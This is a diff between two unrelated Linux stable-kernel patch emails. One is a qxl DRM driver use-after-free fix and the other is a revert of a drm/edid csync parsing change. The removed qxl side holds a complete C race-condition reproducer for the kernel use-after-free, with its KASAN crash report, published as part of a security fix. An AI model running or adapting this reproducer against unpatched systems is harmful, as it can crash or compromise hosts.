@@ -1,26 +1,27 @@
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DA3991171A
-	for <patches@lists.linux.dev>; Mon, 21 Aug 2023 20:10:09 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 5D5CEC433C8;
-	Mon, 21 Aug 2023 20:10:09 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 989001171A
+	for <patches@lists.linux.dev>; Mon, 21 Aug 2023 20:10:12 +0000 (UTC)
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 1DF1CC433C8;
+	Mon, 21 Aug 2023 20:10:11 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1692648609;
-	bh=DFrXod7e+rEk70rvfnpZc9m+uzgu3NGXzQiyfsKQe0Q=;
+	s=korg; t=1692648612;
+	bh=BdxMEQl8zkoGw4RoJlHjGHHislIXVAQ9K4AJKXM2B10=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=qrOqVdG/z9XwYiXBmfK744VyB1Bb1juTRBNNJ/iFzV6ig+knbpbdKHl3e0+qe5tMZ
-	 p4SsiEpcnSkEureZkMfqc3GqRApO1tcS9Ta2Q95mIE6jip9Zd6Qvk/Q527bn31TPHs
-	 T7OL/pVuHPx6vOGhXn5Y49tJL6T52J9rxolO7zvk=
+	b=Jz1IOaQtlc0hrz4AlIgGyEkZ6G4/Ug+kxDeTvXRB4EEhfHajy/WKN9T5QRL8roB4E
+	 IUKHlIGfS2Voiz+4woDhgnli/SDy23LX37C/BiNIkbibAp19gj67S2WIuwgk8GeoxT
+	 Pa34Sc4FZO3F1BaTVGxIuMh5szDON1QB8U+YQi5w=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Wander Lairson Costa <wander@redhat.com>,
-	Dave Airlie <airlied@redhat.com>
-Subject: [PATCH 6.4 220/234] drm/qxl: fix UAF on handle creation
-Date: Mon, 21 Aug 2023 21:43:03 +0200
-Message-ID: <20230821194138.607413327@linuxfoundation.org>
+	=?UTF-8?q?Ville=20Syrj=C3=A4l=C3=A4?= <ville.syrjala@linux.intel.com>,
+	dri-devel@lists.freedesktop.org,
+	Jani Nikula <jani.nikula@intel.com>
+Subject: [PATCH 6.4 221/234] Revert "drm/edid: Fix csync detailed mode parsing"
+Date: Mon, 21 Aug 2023 21:43:04 +0200
+Message-ID: <20230821194138.659991413@linuxfoundation.org>
 X-Mailer: git-send-email 2.41.0
 In-Reply-To: <20230821194128.754601642@linuxfoundation.org>
 References: <20230821194128.754601642@linuxfoundation.org>
@@ -34,352 +35,106 @@ MIME-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
 
-From: Wander Lairson Costa <wander@redhat.com>
+From: Jani Nikula <jani.nikula@intel.com>
 
-commit c611589b4259ed63b9b77be6872b1ce07ec0ac16 upstream.
+commit 50b6f2c8297793f7f3315623db78dcff85158e96 upstream.
 
-qxl_mode_dumb_create() dereferences the qobj returned by
-qxl_gem_object_create_with_handle(), but the handle is the only one
-holding a reference to it.
+This reverts commit ca62297b2085b5b3168bd891ca24862242c635a1.
 
-A potential attacker could guess the returned handle value and closes it
-between the return of qxl_gem_object_create_with_handle() and the qobj
-usage, triggering a use-after-free scenario.
+Commit ca62297b2085 ("drm/edid: Fix csync detailed mode parsing") fixed
+EDID detailed mode sync parsing. Unfortunately, there are quite a few
+displays out there that have bogus (zero) sync field that are broken by
+the change. Zero means analog composite sync, which is not right for
+digital displays, and the modes get rejected. Regardless, it used to
+work, and it needs to continue to work. Revert the change.
 
-Reproducer:
+Rejecting modes with analog composite sync was the part that fixed the
+gitlab issue 8146 [1]. We'll need to get back to the drawing board with
+that.
 
-int dri_fd =-1;
-struct drm_mode_create_dumb arg = {0};
+[1] https://gitlab.freedesktop.org/drm/intel/-/issues/8146
 
-void gem_close(int handle);
-
-void* trigger(void* ptr)
-{
-	int ret;
-	arg.width = arg.height = 0x20;
-	arg.bpp = 32;
-	ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &arg);
-	if(ret)
-	{
-		perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
-		exit(-1);
-	}
-	gem_close(arg.handle);
-	while(1) {
-		struct drm_mode_create_dumb args = {0};
-		args.width = args.height = 0x20;
-		args.bpp = 32;
-		ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &args);
-		if (ret) {
-			perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
-			exit(-1);
-		}
-
-		printf("[*] DRM_IOCTL_MODE_CREATE_DUMB created, %d\n", args.handle);
-		gem_close(args.handle);
-	}
-	return NULL;
-}
-
-void gem_close(int handle)
-{
-	struct drm_gem_close args;
-	args.handle = handle;
-	int ret = ioctl(dri_fd, DRM_IOCTL_GEM_CLOSE, &args); // gem close handle
-	if (!ret)
-		printf("gem close handle %d\n", args.handle);
-}
-
-int main(void)
-{
-	dri_fd= open("/dev/dri/card0", O_RDWR);
-	printf("fd:%d\n", dri_fd);
-
-	if(dri_fd == -1)
-		return -1;
-
-	pthread_t tid1;
-
-	if(pthread_create(&tid1,NULL,trigger,NULL)){
-		perror("[*] thread_create tid1\n");
-		return -1;
-	}
-	while (1)
-	{
-		gem_close(arg.handle);
-	}
-	return 0;
-}
-
-This is a KASAN report:
-
-==================================================================
-BUG: KASAN: slab-use-after-free in qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
-Write of size 1 at addr ffff88801136c240 by task poc/515
-
-CPU: 1 PID: 515 Comm: poc Not tainted 6.3.0 #3
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.0-debian-1.16.0-4 04/01/2014
-Call Trace:
-<TASK>
-__dump_stack linux/lib/dump_stack.c:88
-dump_stack_lvl+0x48/0x70 linux/lib/dump_stack.c:106
-print_address_description linux/mm/kasan/report.c:319
-print_report+0xd2/0x660 linux/mm/kasan/report.c:430
-kasan_report+0xd2/0x110 linux/mm/kasan/report.c:536
-__asan_report_store1_noabort+0x17/0x30 linux/mm/kasan/report_generic.c:383
-qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-RIP: 0033:0x7ff5004ff5f7
-Code: 00 00 00 48 8b 05 99 c8 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 69 c8 0d 00 f7 d8 64 89 01 48
-
-RSP: 002b:00007ff500408ea8 EFLAGS: 00000286 ORIG_RAX: 0000000000000010
-RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ff5004ff5f7
-RDX: 00007ff500408ec0 RSI: 00000000c02064b2 RDI: 0000000000000003
-RBP: 00007ff500408ef0 R08: 0000000000000000 R09: 000000000000002a
-R10: 0000000000000000 R11: 0000000000000286 R12: 00007fff1c6cdafe
-R13: 00007fff1c6cdaff R14: 00007ff500408fc0 R15: 0000000000802000
-</TASK>
-
-Allocated by task 515:
-kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
-kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
-kasan_save_alloc_info+0x1e/0x40 linux/mm/kasan/generic.c:510
-____kasan_kmalloc linux/mm/kasan/common.c:374
-__kasan_kmalloc+0xc3/0xd0 linux/mm/kasan/common.c:383
-kasan_kmalloc linux/./include/linux/kasan.h:196
-kmalloc_trace+0x48/0xc0 linux/mm/slab_common.c:1066
-kmalloc linux/./include/linux/slab.h:580
-kzalloc linux/./include/linux/slab.h:720
-qxl_bo_create+0x11a/0x610 linux/drivers/gpu/drm/qxl/qxl_object.c:124
-qxl_gem_object_create+0xd9/0x360 linux/drivers/gpu/drm/qxl/qxl_gem.c:58
-qxl_gem_object_create_with_handle+0xa1/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:89
-qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-
-Freed by task 515:
-kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
-kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
-kasan_save_free_info+0x2e/0x60 linux/mm/kasan/generic.c:521
-____kasan_slab_free linux/mm/kasan/common.c:236
-____kasan_slab_free+0x180/0x1f0 linux/mm/kasan/common.c:200
-__kasan_slab_free+0x12/0x30 linux/mm/kasan/common.c:244
-kasan_slab_free linux/./include/linux/kasan.h:162
-slab_free_hook linux/mm/slub.c:1781
-slab_free_freelist_hook+0xd2/0x1a0 linux/mm/slub.c:1807
-slab_free linux/mm/slub.c:3787
-__kmem_cache_free+0x196/0x2d0 linux/mm/slub.c:3800
-kfree+0x78/0x120 linux/mm/slab_common.c:1019
-qxl_ttm_bo_destroy+0x140/0x1a0 linux/drivers/gpu/drm/qxl/qxl_object.c:49
-ttm_bo_release+0x678/0xa30 linux/drivers/gpu/drm/ttm/ttm_bo.c:381
-kref_put linux/./include/linux/kref.h:65
-ttm_bo_put+0x50/0x80 linux/drivers/gpu/drm/ttm/ttm_bo.c:393
-qxl_gem_object_free+0x3e/0x60 linux/drivers/gpu/drm/qxl/qxl_gem.c:42
-drm_gem_object_free+0x5c/0x90 linux/drivers/gpu/drm/drm_gem.c:974
-kref_put linux/./include/linux/kref.h:65
-__drm_gem_object_put linux/./include/drm/drm_gem.h:431
-drm_gem_object_put linux/./include/drm/drm_gem.h:444
-qxl_gem_object_create_with_handle+0x151/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:100
-qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
-drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
-drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
-drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
-drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
-vfs_ioctl linux/fs/ioctl.c:51
-__do_sys_ioctl linux/fs/ioctl.c:870
-__se_sys_ioctl linux/fs/ioctl.c:856
-__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
-do_syscall_x64 linux/arch/x86/entry/common.c:50
-do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
-entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
-
-The buggy address belongs to the object at ffff88801136c000
-which belongs to the cache kmalloc-1k of size 1024
-The buggy address is located 576 bytes inside of
-freed 1024-byte region [ffff88801136c000, ffff88801136c400)
-
-The buggy address belongs to the physical page:
-page:0000000089fc329b refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x11368
-head:0000000089fc329b order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
-flags: 0xfffffc0010200(slab|head|node=0|zone=1|lastcpupid=0x1fffff)
-raw: 000fffffc0010200 ffff888007841dc0 dead000000000122 0000000000000000
-raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
-page dumped because: kasan: bad access detected
-
-Memory state around the buggy address:
-ffff88801136c100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-ffff88801136c180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
->ffff88801136c200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-^
-ffff88801136c280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-ffff88801136c300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-==================================================================
-Disabling lock debugging due to kernel taint
-
-Instead of returning a weak reference to the qxl_bo object, return the
-created drm_gem_object and let the caller decrement the reference count
-when it no longer needs it. As a convenience, if the caller is not
-interested in the gobj object, it can pass NULL to the parameter and the
-reference counting is descremented internally.
-
-The bug and the reproducer were originally found by the Zero Day Initiative project (ZDI-CAN-20940).
-
-Link: https://www.zerodayinitiative.com/
-Signed-off-by: Wander Lairson Costa <wander@redhat.com>
-Cc: stable@vger.kernel.org
-Reviewed-by: Dave Airlie <airlied@redhat.com>
-Signed-off-by: Dave Airlie <airlied@redhat.com>
-Link: https://patchwork.freedesktop.org/patch/msgid/20230814165119.90847-1-wander@redhat.com
+Closes: https://gitlab.freedesktop.org/drm/intel/-/issues/8789
+Closes: https://gitlab.freedesktop.org/drm/intel/-/issues/8930
+Closes: https://gitlab.freedesktop.org/drm/intel/-/issues/9044
+Fixes: ca62297b2085 ("drm/edid: Fix csync detailed mode parsing")
+Cc: Ville Syrjälä <ville.syrjala@linux.intel.com>
+Cc: dri-devel@lists.freedesktop.org
+Cc: <stable@vger.kernel.org> # v6.4+
+Signed-off-by: Jani Nikula <jani.nikula@intel.com>
+Acked-by: Ville Syrjälä <ville.syrjala@linux.intel.com>
+Link: https://patchwork.freedesktop.org/patch/msgid/20230815101907.2900768-1-jani.nikula@intel.com
 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- drivers/gpu/drm/qxl/qxl_drv.h   |    2 +-
- drivers/gpu/drm/qxl/qxl_dumb.c  |    5 ++++-
- drivers/gpu/drm/qxl/qxl_gem.c   |   25 +++++++++++++++++--------
- drivers/gpu/drm/qxl/qxl_ioctl.c |    6 ++----
- 4 files changed, 24 insertions(+), 14 deletions(-)
+ drivers/gpu/drm/drm_edid.c |   29 ++++++++---------------------
+ include/drm/drm_edid.h     |   12 +++---------
+ 2 files changed, 11 insertions(+), 30 deletions(-)
 
---- a/drivers/gpu/drm/qxl/qxl_drv.h
-+++ b/drivers/gpu/drm/qxl/qxl_drv.h
-@@ -310,7 +310,7 @@ int qxl_gem_object_create_with_handle(st
- 				      u32 domain,
- 				      size_t size,
- 				      struct qxl_surface *surf,
--				      struct qxl_bo **qobj,
-+				      struct drm_gem_object **gobj,
- 				      uint32_t *handle);
- void qxl_gem_object_free(struct drm_gem_object *gobj);
- int qxl_gem_object_open(struct drm_gem_object *obj, struct drm_file *file_priv);
---- a/drivers/gpu/drm/qxl/qxl_dumb.c
-+++ b/drivers/gpu/drm/qxl/qxl_dumb.c
-@@ -34,6 +34,7 @@ int qxl_mode_dumb_create(struct drm_file
- {
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct qxl_bo *qobj;
-+	struct drm_gem_object *gobj;
- 	uint32_t handle;
- 	int r;
- 	struct qxl_surface surf;
-@@ -62,11 +63,13 @@ int qxl_mode_dumb_create(struct drm_file
+--- a/drivers/gpu/drm/drm_edid.c
++++ b/drivers/gpu/drm/drm_edid.c
+@@ -3424,6 +3424,10 @@ static struct drm_display_mode *drm_mode
+ 			    connector->base.id, connector->name);
+ 		return NULL;
+ 	}
++	if (!(pt->misc & DRM_EDID_PT_SEPARATE_SYNC)) {
++		drm_dbg_kms(dev, "[CONNECTOR:%d:%s] Composite sync not supported\n",
++			    connector->base.id, connector->name);
++	}
  
- 	r = qxl_gem_object_create_with_handle(qdev, file_priv,
- 					      QXL_GEM_DOMAIN_CPU,
--					      args->size, &surf, &qobj,
-+					      args->size, &surf, &gobj,
- 					      &handle);
- 	if (r)
- 		return r;
-+	qobj = gem_to_qxl_bo(gobj);
- 	qobj->is_dumb = true;
-+	drm_gem_object_put(gobj);
- 	args->pitch = pitch;
- 	args->handle = handle;
- 	return 0;
---- a/drivers/gpu/drm/qxl/qxl_gem.c
-+++ b/drivers/gpu/drm/qxl/qxl_gem.c
-@@ -72,32 +72,41 @@ int qxl_gem_object_create(struct qxl_dev
- 	return 0;
- }
+ 	/* it is incorrect if hsync/vsync width is zero */
+ 	if (!hsync_pulse_width || !vsync_pulse_width) {
+@@ -3470,27 +3474,10 @@ static struct drm_display_mode *drm_mode
+ 	if (info->quirks & EDID_QUIRK_DETAILED_SYNC_PP) {
+ 		mode->flags |= DRM_MODE_FLAG_PHSYNC | DRM_MODE_FLAG_PVSYNC;
+ 	} else {
+-		switch (pt->misc & DRM_EDID_PT_SYNC_MASK) {
+-		case DRM_EDID_PT_ANALOG_CSYNC:
+-		case DRM_EDID_PT_BIPOLAR_ANALOG_CSYNC:
+-			drm_dbg_kms(dev, "[CONNECTOR:%d:%s] Analog composite sync!\n",
+-				    connector->base.id, connector->name);
+-			mode->flags |= DRM_MODE_FLAG_CSYNC | DRM_MODE_FLAG_NCSYNC;
+-			break;
+-		case DRM_EDID_PT_DIGITAL_CSYNC:
+-			drm_dbg_kms(dev, "[CONNECTOR:%d:%s] Digital composite sync!\n",
+-				    connector->base.id, connector->name);
+-			mode->flags |= DRM_MODE_FLAG_CSYNC;
+-			mode->flags |= (pt->misc & DRM_EDID_PT_HSYNC_POSITIVE) ?
+-				DRM_MODE_FLAG_PCSYNC : DRM_MODE_FLAG_NCSYNC;
+-			break;
+-		case DRM_EDID_PT_DIGITAL_SEPARATE_SYNC:
+-			mode->flags |= (pt->misc & DRM_EDID_PT_HSYNC_POSITIVE) ?
+-				DRM_MODE_FLAG_PHSYNC : DRM_MODE_FLAG_NHSYNC;
+-			mode->flags |= (pt->misc & DRM_EDID_PT_VSYNC_POSITIVE) ?
+-				DRM_MODE_FLAG_PVSYNC : DRM_MODE_FLAG_NVSYNC;
+-			break;
+-		}
++		mode->flags |= (pt->misc & DRM_EDID_PT_HSYNC_POSITIVE) ?
++			DRM_MODE_FLAG_PHSYNC : DRM_MODE_FLAG_NHSYNC;
++		mode->flags |= (pt->misc & DRM_EDID_PT_VSYNC_POSITIVE) ?
++			DRM_MODE_FLAG_PVSYNC : DRM_MODE_FLAG_NVSYNC;
+ 	}
  
-+/*
-+ * If the caller passed a valid gobj pointer, it is responsible to call
-+ * drm_gem_object_put() when it no longer needs to acess the object.
-+ *
-+ * If gobj is NULL, it is handled internally.
-+ */
- int qxl_gem_object_create_with_handle(struct qxl_device *qdev,
- 				      struct drm_file *file_priv,
- 				      u32 domain,
- 				      size_t size,
- 				      struct qxl_surface *surf,
--				      struct qxl_bo **qobj,
-+				      struct drm_gem_object **gobj,
- 				      uint32_t *handle)
- {
--	struct drm_gem_object *gobj;
- 	int r;
-+	struct drm_gem_object *local_gobj;
+ set_size:
+--- a/include/drm/drm_edid.h
++++ b/include/drm/drm_edid.h
+@@ -61,15 +61,9 @@ struct std_timing {
+ 	u8 vfreq_aspect;
+ } __attribute__((packed));
  
--	BUG_ON(!qobj);
- 	BUG_ON(!handle);
+-#define DRM_EDID_PT_SYNC_MASK              (3 << 3)
+-# define DRM_EDID_PT_ANALOG_CSYNC          (0 << 3)
+-# define DRM_EDID_PT_BIPOLAR_ANALOG_CSYNC  (1 << 3)
+-# define DRM_EDID_PT_DIGITAL_CSYNC         (2 << 3)
+-#  define DRM_EDID_PT_CSYNC_ON_RGB         (1 << 1) /* analog csync only */
+-#  define DRM_EDID_PT_CSYNC_SERRATE        (1 << 2)
+-# define DRM_EDID_PT_DIGITAL_SEPARATE_SYNC (3 << 3)
+-#  define DRM_EDID_PT_HSYNC_POSITIVE       (1 << 1) /* also digital csync */
+-#  define DRM_EDID_PT_VSYNC_POSITIVE       (1 << 2)
++#define DRM_EDID_PT_HSYNC_POSITIVE (1 << 1)
++#define DRM_EDID_PT_VSYNC_POSITIVE (1 << 2)
++#define DRM_EDID_PT_SEPARATE_SYNC  (3 << 3)
+ #define DRM_EDID_PT_STEREO         (1 << 5)
+ #define DRM_EDID_PT_INTERLACED     (1 << 7)
  
- 	r = qxl_gem_object_create(qdev, size, 0,
- 				  domain,
- 				  false, false, surf,
--				  &gobj);
-+				  &local_gobj);
- 	if (r)
- 		return -ENOMEM;
--	r = drm_gem_handle_create(file_priv, gobj, handle);
-+	r = drm_gem_handle_create(file_priv, local_gobj, handle);
- 	if (r)
- 		return r;
--	/* drop reference from allocate - handle holds it now */
--	*qobj = gem_to_qxl_bo(gobj);
--	drm_gem_object_put(gobj);
-+
-+	if (gobj)
-+		*gobj = local_gobj;
-+	else
-+		/* drop reference from allocate - handle holds it now */
-+		drm_gem_object_put(local_gobj);
-+
- 	return 0;
- }
- 
---- a/drivers/gpu/drm/qxl/qxl_ioctl.c
-+++ b/drivers/gpu/drm/qxl/qxl_ioctl.c
-@@ -38,7 +38,6 @@ int qxl_alloc_ioctl(struct drm_device *d
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct drm_qxl_alloc *qxl_alloc = data;
- 	int ret;
--	struct qxl_bo *qobj;
- 	uint32_t handle;
- 	u32 domain = QXL_GEM_DOMAIN_VRAM;
- 
-@@ -50,7 +49,7 @@ int qxl_alloc_ioctl(struct drm_device *d
- 						domain,
- 						qxl_alloc->size,
- 						NULL,
--						&qobj, &handle);
-+						NULL, &handle);
- 	if (ret) {
- 		DRM_ERROR("%s: failed to create gem ret=%d\n",
- 			  __func__, ret);
-@@ -386,7 +385,6 @@ int qxl_alloc_surf_ioctl(struct drm_devi
- {
- 	struct qxl_device *qdev = to_qxl(dev);
- 	struct drm_qxl_alloc_surf *param = data;
--	struct qxl_bo *qobj;
- 	int handle;
- 	int ret;
- 	int size, actual_stride;
-@@ -406,7 +404,7 @@ int qxl_alloc_surf_ioctl(struct drm_devi
- 						QXL_GEM_DOMAIN_SURFACE,
- 						size,
- 						&surf,
--						&qobj, &handle);
-+						NULL, &handle);
- 	if (ret) {
- 		DRM_ERROR("%s: failed to create gem ret=%d\n",
- 			  __func__, ret);
 
 
